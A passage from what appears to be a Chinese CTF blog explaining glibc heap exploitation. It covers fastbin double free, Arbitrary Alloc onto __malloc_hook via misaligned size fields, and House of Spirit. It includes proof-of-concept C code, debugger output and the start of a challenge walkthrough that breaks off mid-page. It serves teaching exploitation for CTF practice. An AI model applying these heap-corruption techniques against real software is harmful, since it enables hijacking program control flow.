class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs dns">*** Error in `./tst&#x27;: malloc(): memory corruption (fast): <span class="hljs-number">0</span>x00000<span class="hljs-number">00000601090</span> ***<br>======= Backtrace: =========<br>/lib/x86_64-linux-gnu/libc.so.<span class="hljs-number">6</span>(+<span class="hljs-number">0x777e5</span>)[<span class="hljs-number">0</span>x7f8f9deb27e5]<br>/lib/x86_64-linux-gnu/libc.so.<span class="hljs-number">6</span>(+<span class="hljs-number">0x82651</span>)[<span class="hljs-number">0</span>x7f8f9debd651]<br>/lib/x86_64-linux-gnu/libc.so.<span class="hljs-number">6</span>(__libc_malloc+<span class="hljs-number">0</span>x54)[<span class="hljs-number">0</span>x7f8f9debf184]<br>./tst[<span class="hljs-number">0x400636</span>]<br>/lib/x86_64-linux-gnu/libc.so.<span class="hljs-number">6</span>(__libc_start_main+<span class="hljs-number">0</span>xf0)[<span class="hljs-number">0</span>x7f8f9de5b830]<br>./tst[<span class="hljs-number">0x4004e9</span>]<br>======= Memory map: ========<br><span class="hljs-number">00400000</span>-<span class="hljs-number">00401000</span> r-xp <span class="hljs-number">00000000 08</span>:<span class="hljs-number">01 1052570</span>                            /home/Ox9A82/tst/tst<br><span class="hljs-number">00600000</span>-<span class="hljs-number">00601000</span> r--p <span class="hljs-number">00000000 08</span>:<span class="hljs-number">01 1052570</span>                            /home/Ox9A82/tst/tst<br><span class="hljs-number">00601000</span>-<span class="hljs-number">00602000</span> rw-p <span class="hljs-number">00001000 08</span>:<span class="hljs-number">01 1052570</span>                            /home/Ox9A82/tst/tst<br><span class="hljs-number">00</span>bc4000-<span class="hljs-number">00</span>be5000 rw-p <span class="hljs-number">00000000 00</span>:<span class="hljs-number">00</span> <span class="hljs-number">0</span>                                  [heap]<br><span class="hljs-number">7</span>f<span class="hljs-number">8f98000000</span>-<span class="hljs-number">7</span>f<span class="hljs-number">8f98021000</span> rw-p <span class="hljs-number">00000000 00</span>:<span class="hljs-number">00</span> <span class="hljs-number">0</span><br><span class="hljs-number">7</span>f<span class="hljs-number">8f98021000</span>-<span class="hljs-number">7</span>f8f<span class="hljs-number">9c000000</span> ---p <span class="hljs-number">00000000 00</span>:<span class="hljs-number">00</span> <span class="hljs-number">0</span><br><span class="hljs-number">7</span>f8f9dc25000-<span class="hljs-number">7</span>f8f9dc3b000 r-xp <span class="hljs-number">00000000 08</span>:<span class="hljs-number">01 398790</span>                     /lib/x86_64-linux-gnu/libgcc_s.so.<span class="hljs-number">1</span><br><span class="hljs-number">7</span>f8f9dc3b000-<span class="hljs-number">7</span>f8f9de3a000 ---p <span class="hljs-number">00016000 08</span>:<span class="hljs-number">01 398790</span>                     /lib/x86_64-linux-gnu/libgcc_s.so.<span class="hljs-number">1</span><br><span class="hljs-number">7</span>f8f9de3a000-<span class="hljs-number">7</span>f8f9de3b000 rw-p <span class="hljs-number">00015000 08</span>:<span class="hljs-number">01 398790</span>                     /lib/x86_64-linux-gnu/libgcc_s.so.<span class="hljs-number">1</span><br><span class="hljs-number">7</span>f8f9de3b000-<span class="hljs-number">7</span>f8f9dffb000 r-xp <span class="hljs-number">00000000 08</span>:<span class="hljs-number">01 415688</span>                     /lib/x86_64-linux-gnu/libc-<span class="hljs-number">2</span>.<span class="hljs-number">23</span>.so<br><span class="hljs-number">7</span>f8f9dffb000-<span class="hljs-number">7</span>f8f9e1fb000 ---p <span class="hljs-number">001c0000</span> <span class="hljs-number">08</span>:<span class="hljs-number">01 415688</span>                     /lib/x86_64-linux-gnu/libc-<span class="hljs-number">2</span>.<span class="hljs-number">23</span>.so<br><span class="hljs-number">7</span>f8f9e1fb000-<span class="hljs-number">7</span>f8f9e1ff000 r--p <span class="hljs-number">001c0000</span> <span class="hljs-number">08</span>:<span class="hljs-number">01 415688</span>                     /lib/x86_64-linux-gnu/libc-<span class="hljs-number">2</span>.<span class="hljs-number">23</span>.so<br><span class="hljs-number">7</span>f8f9e1ff000-<span class="hljs-number">7</span>f<span class="hljs-number">8f9e201000</span> rw-p <span class="hljs-number">001c4000</span> <span class="hljs-number">08</span>:<span class="hljs-number">01 415688</span>                     /lib/x86_64-linux-gnu/libc-<span class="hljs-number">2</span>.<span class="hljs-number">23</span>.so<br><span class="hljs-number">7</span>f<span class="hljs-number">8f9e201000</span>-<span class="hljs-number">7</span>f<span class="hljs-number">8f9e205000</span> rw-p <span class="hljs-number">00000000 00</span>:<span class="hljs-number">00</span> <span class="hljs-number">0</span><br><span class="hljs-number">7</span>f<span class="hljs-number">8f9e205000</span>-<span class="hljs-number">7</span>f8f<span class="hljs-number">9e22b000</span> r-xp <span class="hljs-number">00000000 08</span>:<span class="hljs-number">01 407367</span>                     /lib/x86_64-linux-gnu/ld-<span class="hljs-number">2</span>.<span class="hljs-number">23</span>.so<br><span class="hljs-number">7</span>f8f<span class="hljs-number">9e40d000</span>-<span class="hljs-number">7</span>f8f<span class="hljs-number">9e410000</span> rw-p <span class="hljs-number">00000000 00</span>:<span class="hljs-number">00</span> <span class="hljs-number">0</span><br><span class="hljs-number">7</span>f8f<span class="hljs-number">9e427000</span>-<span class="hljs-number">7</span>f8f<span class="hljs-number">9e42a000</span> rw-p <span class="hljs-number">00000000 00</span>:<span class="hljs-number">00</span> <span class="hljs-number">0</span><br><span class="hljs-number">7</span>f8f<span class="hljs-number">9e42a000</span>-<span class="hljs-number">7</span>f8f<span class="hljs-number">9e42b000</span> r--p <span class="hljs-number">00025000 08</span>:<span class="hljs-number">01 407367</span>                     /lib/x86_64-linux-gnu/ld-<span class="hljs-number">2</span>.<span class="hljs-number">23</span>.so<br><span class="hljs-number">7</span>f8f<span class="hljs-number">9e42b000</span>-<span class="hljs-number">7</span>f8f<span class="hljs-number">9e42c000</span> rw-p <span class="hljs-number">00026000 08</span>:<span class="hljs-number">01 407367</span>                     /lib/x86_64-linux-gnu/ld-<span class="hljs-number">2</span>.<span class="hljs-number">23</span>.so<br><span class="hljs-number">7</span>f8f<span class="hljs-number">9e42c000</span>-<span class="hljs-number">7</span>f8f<span class="hljs-number">9e42d000</span> rw-p <span class="hljs-number">00000000 00</span>:<span class="hljs-number">00</span> <span class="hljs-number">0</span><br><span class="hljs-number">7</span>fff<span class="hljs-number">71a94000</span>-<span class="hljs-number">7</span>fff71ab5000 rw-p <span class="hljs-number">00000000 00</span>:<span class="hljs-number">00</span> <span class="hljs-number">0</span>                          [stack]<br><span class="hljs-number">7</span>fff71bd9000-<span class="hljs-number">7</span>fff71bdb000 r--p <span class="hljs-number">00000000 00</span>:<span class="hljs-number">00</span> <span class="hljs-number">0</span>                          [vvar]<br><span class="hljs-number">7</span>fff71bdb000-<span class="hljs-number">7</span>fff71bdd000 r-xp <span class="hljs-number">00000000 00</span>:<span class="hljs-number">00</span> <span class="hljs-number">0</span>                          [vdso]<br>ffffffffff600000-ffffffffff601000 r-xp <span class="hljs-number">00000000 00</span>:<span class="hljs-number">00</span> <span class="hljs-number">0</span>                  [vsyscall]<br>已放弃 (核心已转储)<br></code></pre></td></tr></table></figure><p>_int_malloc 中的校验如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span> (__builtin_expect (fastbin_index (chunksize (victim)) != idx, <span class="hljs-number">0</span>))<br>    &#123;<br>      errstr = <span class="hljs-string">&quot;malloc(): memory corruption (fast)&quot;</span>;<br>    errout:<br>      malloc_printerr (check_action, errstr, chunk2mem (victim));<br>      <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="小总结"><a href="#小总结" class="headerlink" title="小总结"></a>小总结</h3><p>通过 fastbin double free 我们可以使用多个指针控制同一个堆块，这可以用于篡改一些堆块中的关键数据域或者是实现类似于类型混淆的效果。 如果更进一步修改 fd 指针，则能够实现任意地址分配堆块的效果 (首先要通过验证)，这就相当于任意地址写任意值的效果。</p><h2 id="House-Of-Spirit"><a href="#House-Of-Spirit" class="headerlink" title="House Of Spirit"></a>House Of Spirit</h2><p>可以看这篇<a href="https://tkymax.github.io/2024/08/02/House-of-Spirit%E6%94%BB%E5%87%BB/">博客</a></p><h2 id="Alloc-to-Stack-Arbitrary-Alloc"><a href="#Alloc-to-Stack-Arbitrary-Alloc" class="headerlink" title="Alloc to Stack &amp;&amp; Arbitrary Alloc"></a>Alloc to Stack &amp;&amp; Arbitrary Alloc</h2><h3 id="介绍-1"><a href="#介绍-1" class="headerlink" title="介绍"></a>介绍</h3><p>对于这两个技术，我个人感觉十分相似，都是篡改fd指针指向伪造的chunk，而第二种技术相对来说，涵盖了第一种，我们直接简绍第二种</p><p>事实上只要满足目标地址存在合法的 size 域（这个 size 域是构造的，还是自然存在的都无妨），我们可以把 chunk 分配到任意的可写内存中，比如 bss、heap、data、stack 等等。</p><h3 id="演示-1"><a href="#演示-1" class="headerlink" title="演示"></a>演示</h3><p>在这个例子，我们使用字节错位来实现直接分配 fastbin 到<strong>_malloc_hook 的位置，相当于覆盖_malloc_hook 来控制程序流程。</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br><br><br>    <span class="hljs-type">void</span> *chunk1;<br>    <span class="hljs-type">void</span> *chunk_a;<br><br>    chunk1=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x60</span>);<br><br>    <span class="hljs-built_in">free</span>(chunk1);<br><br>    *(<span class="hljs-type">long</span> <span class="hljs-type">long</span> *)chunk1=<span class="hljs-number">0x7ffff7dd1af5</span><span class="hljs-number">-0x8</span>;<br>    <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x60</span>);<br>    chunk_a=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x60</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>这里的 0x7ffff7dd1af5 是我根据本机的情况得出的值，这个值是怎么获得的呢？首先我们要观察欲写入地址附近是否存在可以字节错位的情况。</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">0x7ffff7dd1a88</span> <span class="hljs-number">0</span>x0  <span class="hljs-number">0</span>x0 <span class="hljs-number">0</span>x0 <span class="hljs-number">0</span>x0 <span class="hljs-number">0</span>x0 <span class="hljs-number">0</span>x0 <span class="hljs-number">0</span>x0 <span class="hljs-number">0</span>x0<br><span class="hljs-attribute">0x7ffff7dd1a90</span> <span class="hljs-number">0</span>x0  <span class="hljs-number">0</span>x0 <span class="hljs-number">0</span>x0 <span class="hljs-number">0</span>x0 <span class="hljs-number">0</span>x0 <span class="hljs-number">0</span>x0 <span class="hljs-number">0</span>x0 <span class="hljs-number">0</span>x0<br><span class="hljs-attribute">0x7ffff7dd1a98</span> <span class="hljs-number">0</span>x0  <span class="hljs-number">0</span>x0 <span class="hljs-number">0</span>x0 <span class="hljs-number">0</span>x0 <span class="hljs-number">0</span>x0 <span class="hljs-number">0</span>x0 <span class="hljs-number">0</span>x0 <span class="hljs-number">0</span>x0<br><span class="hljs-attribute">0x7ffff7dd1aa0</span> <span class="hljs-number">0</span>x0  <span class="hljs-number">0</span>x0 <span class="hljs-number">0</span>x0 <span class="hljs-number">0</span>x0 <span class="hljs-number">0</span>x0 <span class="hljs-number">0</span>x0 <span class="hljs-number">0</span>x0 <span class="hljs-number">0</span>x0<br><span class="hljs-attribute">0x7ffff7dd1aa8</span> <span class="hljs-number">0</span>x0  <span class="hljs-number">0</span>x0 <span class="hljs-number">0</span>x0 <span class="hljs-number">0</span>x0 <span class="hljs-number">0</span>x0 <span class="hljs-number">0</span>x0 <span class="hljs-number">0</span>x0 <span class="hljs-number">0</span>x0<br><span class="hljs-attribute">0x7ffff7dd1ab0</span> <span class="hljs-number">0</span>x0  <span class="hljs-number">0</span>x0 <span class="hljs-number">0</span>x0 <span class="hljs-number">0</span>x0 <span class="hljs-number">0</span>x0 <span class="hljs-number">0</span>x0 <span class="hljs-number">0</span>x0 <span class="hljs-number">0</span>x0<br><span class="hljs-attribute">0x7ffff7dd1ab8</span> <span class="hljs-number">0</span>x0  <span class="hljs-number">0</span>x0 <span class="hljs-number">0</span>x0 <span class="hljs-number">0</span>x0 <span class="hljs-number">0</span>x0 <span class="hljs-number">0</span>x0 <span class="hljs-number">0</span>x0 <span class="hljs-number">0</span>x0<br><span class="hljs-attribute">0x7ffff7dd1ac0</span> <span class="hljs-number">0</span>x0  <span class="hljs-number">0</span>x0 <span class="hljs-number">0</span>x0 <span class="hljs-number">0</span>x0 <span class="hljs-number">0</span>x0 <span class="hljs-number">0</span>x0 <span class="hljs-number">0</span>x0 <span class="hljs-number">0</span>x0<br><span class="hljs-attribute">0x7ffff7dd1ac8</span> <span class="hljs-number">0</span>x0  <span class="hljs-number">0</span>x0 <span class="hljs-number">0</span>x0 <span class="hljs-number">0</span>x0 <span class="hljs-number">0</span>x0 <span class="hljs-number">0</span>x0 <span class="hljs-number">0</span>x0 <span class="hljs-number">0</span>x0<br><span class="hljs-attribute">0x7ffff7dd1ad0</span> <span class="hljs-number">0</span>x0  <span class="hljs-number">0</span>x0 <span class="hljs-number">0</span>x0 <span class="hljs-number">0</span>x0 <span class="hljs-number">0</span>x0 <span class="hljs-number">0</span>x0 <span class="hljs-number">0</span>x0 <span class="hljs-number">0</span>x0<br><span class="hljs-attribute">0x7ffff7dd1ad8</span> <span class="hljs-number">0</span>x0  <span class="hljs-number">0</span>x0 <span class="hljs-number">0</span>x0 <span class="hljs-number">0</span>x0 <span class="hljs-number">0</span>x0 <span class="hljs-number">0</span>x0 <span class="hljs-number">0</span>x0 <span class="hljs-number">0</span>x0<br><span class="hljs-attribute">0x7ffff7dd1ae0</span> <span class="hljs-number">0</span>x0  <span class="hljs-number">0</span>x0 <span class="hljs-number">0</span>x0 <span class="hljs-number">0</span>x0 <span class="hljs-number">0</span>x0 <span class="hljs-number">0</span>x0 <span class="hljs-number">0</span>x0 <span class="hljs-number">0</span>x0<br><span class="hljs-attribute">0x7ffff7dd1ae8</span> <span class="hljs-number">0</span>x0  <span class="hljs-number">0</span>x0 <span class="hljs-number">0</span>x0 <span class="hljs-number">0</span>x0 <span class="hljs-number">0</span>x0 <span class="hljs-number">0</span>x0 <span class="hljs-number">0</span>x0 <span class="hljs-number">0</span>x0<br><span class="hljs-attribute">0x7ffff7dd1af0</span> <span class="hljs-number">0</span>x60 <span class="hljs-number">0</span>x2 <span class="hljs-number">0</span>xdd <span class="hljs-number">0</span>xf7 <span class="hljs-number">0</span>xff <span class="hljs-number">0</span>x7f <span class="hljs-number">0</span>x0 <span class="hljs-number">0</span>x0<br><span class="hljs-attribute">0x7ffff7dd1af8</span> <span class="hljs-number">0</span>x0  <span class="hljs-number">0</span>x0 <span class="hljs-number">0</span>x0 <span class="hljs-number">0</span>x0 <span class="hljs-number">0</span>x0 <span class="hljs-number">0</span>x0 <span class="hljs-number">0</span>x0 <span class="hljs-number">0</span>x0<br><span class="hljs-attribute">0x7ffff7dd1b00</span> <span class="hljs-number">0</span>x20 <span class="hljs-number">0</span>x2e <span class="hljs-number">0</span>xa9 <span class="hljs-number">0</span>xf7 <span class="hljs-number">0</span>xff <span class="hljs-number">0</span>x7f <span class="hljs-number">0</span>x0 <span class="hljs-number">0</span>x0<br><span class="hljs-attribute">0x7ffff7dd1b08</span> <span class="hljs-number">0</span>x0  <span class="hljs-number">0</span>x2a <span class="hljs-number">0</span>xa9 <span class="hljs-number">0</span>xf7 <span class="hljs-number">0</span>xff <span class="hljs-number">0</span>x7f <span class="hljs-number">0</span>x0 <span class="hljs-number">0</span>x0<br><span class="hljs-attribute">0x7ffff7dd1b10</span> &lt;__malloc_hook&gt;: <span class="hljs-number">0</span>x30    <span class="hljs-number">0</span>x28    <span class="hljs-number">0</span>xa9    <span class="hljs-number">0</span>xf7    <span class="hljs-number">0</span>xff    <span class="hljs-number">0</span>x7f    <span class="hljs-number">0</span>x0 <span class="hljs-number">0</span>x0<br></code></pre></td></tr></table></figure><p>0x7ffff7dd1b10 是我们想要控制的 __malloc_hook 的地址，于是我们向上寻找是否可以错位出一个合法的 size 域。因为这个程序是 64 位的，因此 fastbin 的范围为 32 字节到 128 字节 (0x20-0x80)，如下：</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs arduino"><span class="hljs-comment">//这里的size指用户区域，因此要小2倍SIZE_SZ</span><br>Fastbins[idx=<span class="hljs-number">0</span>, size=<span class="hljs-number">0x10</span>]<br>Fastbins[idx=<span class="hljs-number">1</span>, size=<span class="hljs-number">0x20</span>]<br>Fastbins[idx=<span class="hljs-number">2</span>, size=<span class="hljs-number">0x30</span>]<br>Fastbins[idx=<span class="hljs-number">3</span>, size=<span class="hljs-number">0x40</span>]<br>Fastbins[idx=<span class="hljs-number">4</span>, size=<span class="hljs-number">0x50</span>]<br>Fastbins[idx=<span class="hljs-number">5</span>, size=<span class="hljs-number">0x60</span>]<br>Fastbins[idx=<span class="hljs-number">6</span>, size=<span class="hljs-number">0x70</span>]<br></code></pre></td></tr></table></figure><p>通过观察发现 0x7ffff7dd1af5 处可以现实错位构造出一个 0x000000000000007f</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">0x7ffff7dd1af0</span> <span class="hljs-number">0</span>x60 <span class="hljs-number">0</span>x2 <span class="hljs-number">0</span>xdd <span class="hljs-number">0</span>xf7 <span class="hljs-number">0</span>xff <span class="hljs-number">0</span>x7f <span class="hljs-number">0</span>x0 <span class="hljs-number">0</span>x0<br><span class="hljs-attribute">0x7ffff7dd1af8</span> <span class="hljs-number">0</span>x0  <span class="hljs-number">0</span>x0 <span class="hljs-number">0</span>x0 <span class="hljs-number">0</span>x0 <span class="hljs-number">0</span>x0 <span class="hljs-number">0</span>x0 <span class="hljs-number">0</span>x0 <span class="hljs-number">0</span>x0<br><br><span class="hljs-attribute">0x7ffff7dd1af5</span> &lt;_IO_wide_data_0+<span class="hljs-number">309</span>&gt;:   <span class="hljs-number">0</span>x000000000000007f<br></code></pre></td></tr></table></figure><p>因为 0x7f 在计算 fastbin index 时(64位)，是属于 index 5 的，即 chunk 大小为 0x70 的。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c">#<span class="hljs-meta">#<span class="hljs-keyword">define</span> fastbin_index(sz)                                                      </span><br>    ((((<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>) (sz)) &gt;&gt; (SIZE_SZ == <span class="hljs-number">8</span> ? <span class="hljs-number">4</span> : <span class="hljs-number">3</span>)) - <span class="hljs-number">2</span>)<br></code></pre></td></tr></table></figure><p>（注意 sz 的大小是 unsigned int，因此只占 4 个字节）</p><p>而其大小又包含了 0x10 的 chunk_header，因此我们选择分配 0x60 的 fastbin，将其加入链表。 最后经过两次分配可以观察到 chunk 被分配到 0x7ffff7dd1afd，因此我们就可以直接控制 __malloc_hook 的内容 (在我的 libc 中__realloc_hook 与__malloc_hook 是在连在一起的)。</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-number">0x4005a8</span> &lt;main+<span class="hljs-number">66</span>&gt;        <span class="hljs-keyword">call</span>   <span class="hljs-number">0x400450</span> &lt;malloc@plt&gt;<br> →   <span class="hljs-number">0x4005ad</span> &lt;main+<span class="hljs-number">71</span>&gt;        <span class="hljs-keyword">mov</span>    <span class="hljs-built_in">QWORD</span> <span class="hljs-built_in">PTR</span> [<span class="hljs-built_in">rbp</span>-<span class="hljs-number">0x8</span>], <span class="hljs-built_in">rax</span><br><br> $<span class="hljs-built_in">rax</span>   : <span class="hljs-number">0x7ffff7dd1afd</span><br><br><span class="hljs-number">0x7ffff7dd1aed</span> &lt;_IO_wide_data_0+<span class="hljs-number">301</span>&gt;:   <span class="hljs-number">0xfff7dd0260000000</span>  <span class="hljs-number">0x000000000000007f</span><br><span class="hljs-number">0x7ffff7dd1afd</span>: <span class="hljs-number">0xfff7a92e20000000</span>  <span class="hljs-number">0xfff7a92a0000007f</span><br><span class="hljs-number">0x7ffff7dd1b0d</span> &lt;__realloc_hook+<span class="hljs-number">5</span>&gt;:  <span class="hljs-number">0x000000000000007f</span>  <span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x7ffff7dd1b1d</span>: <span class="hljs-number">0x0000000000000000</span>  <span class="hljs-number">0x0000000000000000</span><br></code></pre></td></tr></table></figure><h3 id="小总结-1"><a href="#小总结-1" class="headerlink" title="小总结"></a>小总结</h3><p>Arbitrary Alloc 在 CTF 中用地更加频繁。我们可以利用字节错位等方法来绕过 size 域的检验，实现任意地址分配 chunk，最后的效果也就相当于任意地址写任意值。</p>]]></content>
    
    
    <categories>
      
      <category>堆</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Fastbin Attack</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>House of Spirit攻击</title>
    <link href="/2024/08/02/House-of-Spirit%E6%94%BB%E5%87%BB/"/>
    <url>/2024/08/02/House-of-Spirit%E6%94%BB%E5%87%BB/</url>
    
    <content type="html"><![CDATA[<h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>House of Spirit是一种堆利用方法，其核心在于通过任意地址的释放达到篡改地址的目的。</p><p>利用条件：</p><ol><li>在目标地址周围能够伪造一个堆块。</li><li>能对伪造堆块地址周围进行一次释放（即将伪造的堆块地址作为free函数的参数进行一次释放操作）</li><li>释放之后能够重新申请得到这个堆块并篡改目标地址的内容</li></ol><p>这里给出一个POC代码如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;time.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">init</span><span class="hljs-params">()</span> &#123;<br>setvbuf(<span class="hljs-built_in">stdout</span>, <span class="hljs-number">0</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0</span>);<br>setvbuf(<span class="hljs-built_in">stdin</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>);<br>setvbuf(<span class="hljs-built_in">stderr</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>);<br>&#125;<br><br><span class="hljs-type">long</span> <span class="hljs-type">long</span> data[<span class="hljs-number">0x20</span>] = &#123;<span class="hljs-number">0</span>&#125;;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>&#123;<br><span class="hljs-type">int</span> size = <span class="hljs-number">0x70</span>;<br><span class="hljs-type">void</span> *p;<br>init();<br><span class="hljs-comment">// init arena</span><br><span class="hljs-built_in">malloc</span>(<span class="hljs-number">0</span>);<br><span class="hljs-comment">// fake chunk header</span><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%p\n&quot;</span>,data);<br>data[<span class="hljs-number">0</span>] = <span class="hljs-number">0x0</span>;<br>data[<span class="hljs-number">1</span>] = size | <span class="hljs-number">1</span>; <span class="hljs-comment">// prev_inuse_bit</span><br><span class="hljs-comment">// fake next chunk header</span><br>data[size / <span class="hljs-number">8</span>] = <span class="hljs-number">0x0</span>;<br>data[(size / <span class="hljs-number">8</span>) + <span class="hljs-number">1</span>] = <span class="hljs-number">0x11</span>;<br>sleep(<span class="hljs-number">0</span>);<br><span class="hljs-comment">// free user data place, fd.</span><br><span class="hljs-built_in">free</span>(&amp;data[<span class="hljs-number">2</span>]);<br>sleep(<span class="hljs-number">0</span>);<br><span class="hljs-comment">// user&#x27;s size == chunk_size - 0x10</span><br>p = <span class="hljs-built_in">malloc</span>(size - <span class="hljs-number">0x10</span>);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%p\n&quot;</span>,p);<br>sleep(<span class="hljs-number">0</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>gcc编译一下进行调试分析</p><p>运行结果如下</p><p><img src="https://cdn.jsdelivr.net/gh/tkymax/Picture/test/202408022055703.png" alt="运行结果"></p><p>调试命令如下：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs sh">gdb House_of_Spirit<br>b <span class="hljs-built_in">sleep</span><br>r<br>x /20gz 0x6010a0<br></code></pre></td></tr></table></figure><p>x指令结果为</p><p><img src="https://cdn.jsdelivr.net/gh/tkymax/Picture/test/202408022100510.png" alt="x指令结果"></p><p>bins指令结果为</p><p><img src="https://cdn.jsdelivr.net/gh/tkymax/Picture/test/202408022149700.png" alt="bins指令结果"></p><p>可以看到我们伪造chunk成功，prev_size为0，size字段为0x71。</p><p>这里我们还需要伪造下一个chunk的头部，如果不伪造，就会报错。因为会检查下一个chunk的size字段，如果下一个chunk的字段不在正常范围内（2*SIZE_SZ到av-&gt;system_mem），则会报错退出，所以在伪造chunk的时候，不仅要伪造当前的chunk头，还要伪造下一个chunk的头部</p><h2 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h2><p>例题下载：<a href="https://gitee.com/tky5216/CTF/raw/master/PWN/heap/pwn144_1604">例题</a></p><p>查看保护</p><p><img src="https://cdn.jsdelivr.net/gh/tkymax/Picture/test/202408022122900.png" alt="查看保护"></p><p>IDA反编译发现后门函数</p><p><img src="https://cdn.jsdelivr.net/gh/tkymax/Picture/test/202408022130508.png" alt="后门函数"></p><p>在main函数中满足一定条件可以调用后门函数</p><p><img src="https://cdn.jsdelivr.net/gh/tkymax/Picture/test/202408022129971.png" alt="main函数"></p><p>magic 为在 bss 段的全局变量，如果我们能够控制 v3 为 114514 并且覆写 magic 使其值⼤于 114514 ，就能get flag。</p><p>看菜单menu()</p><p><img src="https://cdn.jsdelivr.net/gh/tkymax/Picture/test/202408022131344.png" alt="菜单"></p><p>打开create_heap():</p><p><img src="https://cdn.jsdelivr.net/gh/tkymax/Picture/test/202408022133356.png" alt="create_heap"></p><p>heaparray 数组：存放 chunk 的⾸地址。</p><p>read_input(heaparray[i], size)：把我们输⼊的内容写⼊ chunk 中。</p><p>且heaparray是存放在bss段上</p><p><img 